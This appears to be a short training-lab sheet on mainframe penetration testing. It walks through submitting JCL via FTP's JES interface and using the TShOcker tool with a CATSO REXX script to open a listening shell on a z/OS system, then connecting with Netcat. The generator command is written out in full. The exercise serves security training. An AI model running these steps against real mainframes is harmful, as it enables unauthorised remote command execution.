Lab 07: Use FTP to execute JCL

- Connect to the mainframe with FTP
- Issue the FTP command: SITE FILE=JES
- Upload your JCL*
- Download the job results

This can be ANY JCL. Example JCL is available in the folder `Labs/Day 1/Lab 01/JCL`.

Bonus: What other FTP commands are interesting?

Using JCL and REXX and FTP Execute some code. You can use TShocker to make the JCL for you. It include a rexx script called 'CATSO.rexx'. Or feel free to write your own REXX script.

TShOcker:

./TShOcker.py -p PORT -l --lport "<choose a port>" --print IP USERNAME PASSWORD > ./JCL_REXX

--print means 'Print the JCL'
PORT = Mainframe Port
--lport is the listening port you want
IP = Mainframe IP/Hostname
USERNAME/PASSWORD = Username and Password

Then connect with Netcat on the port you selected for --lport
